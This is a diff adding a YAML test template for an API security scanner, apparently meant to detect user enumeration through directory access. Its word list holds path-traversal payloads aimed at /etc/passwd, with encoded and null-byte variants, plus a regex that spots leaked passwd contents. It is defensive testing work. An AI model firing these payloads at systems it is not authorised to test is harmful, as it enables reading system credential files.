@@ -1,0 +1,146 @@
+id: USER_ENUM_FOLDER_ACCESS
+info:
+  name: "User Enumeration using Directory Access"
+  description: >
+    "User Enumeration using Directory Access entails examining HTTP responses when  accessing directory paths with invalid and valid user credentials. For instance,  an attempt with an invalid user may yield a 403 (Forbidden) response, while a  valid user could result in a 404 (Not Found) response. This analysis aids in  identifying and addressing potential security risks related to unauthorized  user enumeration, enhancing the overall security posture of web applications."
+  details: >
+    "User Enumeration using Directory Access involves scrutinizing HTTP responses when  accessing directory paths with different user credentials. For instance, an attempt  with an invalid user might trigger a 403 (Forbidden) response, whereas a valid user  could elicit a 404 (Not Found) response. This examination helps identify potential  security vulnerabilities tied to unauthorized user enumeration, contributing to  improved web application security."
+  impact: >
+    "The impact of User Enumeration using Directory Access lies in its potential to expose  security vulnerabilities within web applications. By discerning distinct HTTP responses  for invalid and valid user credentials, attackers can gain insights into valid usernames,  facilitating targeted exploits. This form of enumeration poses a threat to  confidentiality and can lead to unauthorized access, making it crucial for organizations  to address and remediate such vulnerabilities to safeguard their systems and user data."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: USER_ENUM_FOLDER_ACCESS
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa2-broken-user-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+auth:
+  authenticated: true
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    extract: urlVar
+
+wordLists:
+  folderPaths:
+    - etc/passwd
+    - etc/npasswd
+    - ..//etc/passwd
+    - ../..//etc/passwd
+    - ../../..//etc/passwd
+    - ../../../..//etc/passwd
+    - ../../../../..//etc/passwd
+    - ../../../../../..//etc/passwd
+    - ..%2f/etc/passwd
+    - ..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..\/etc/passwd
+    - ..\..\/etc/passwd
+    - ..\..\..\/etc/passwd
+    - ..\..\..\..\/etc/passwd
+    - 0x2e0x2e//etc/passwd
+    - 0x2e0x2e/0x2e0x2e//etc/passwd
+    - ..0x2f/etc/passwd
+    - ..0x2f..0x2f/etc/passwd
+    - ..0x2f..0x2f..0x2f/etc/passwd
+    - ..///etc/passwd
+    - ..//..///etc/passwd
+    - ..//..//..///etc/passwd
+    - .\\..\\/etc/passwd
+    - .\\..\\.\\..\\/etc/passwd
+    - ../../../../../../../../../../../../etc/passwd%00
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_url: ${urlVar}/${folderPaths}
+        - validate:
+            response_code:
+              eq: 404
+            response_payload:
+              not_contains:
+                - rate-limit
+                - rate_limit
+                - rate limit
+                - account is locked
+                - account is blocked
+                - multiple failed attempt
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_url: ${urlVar}/${folderPaths}
+        - replace_auth_header: true
+        - validate:
+            response_code:
+              neq: 404
+            response_payload:
+              regex: "root:.*:0:0:"
+              not_contains:
+                - invalid
+                - expired
+                - failed
+                - rate-limit
+                - rate_limit
+                - rate limit
+                - account is locked
+                - account is blocked
+                - multiple failed attempt
+strategy:
+  run_once: /
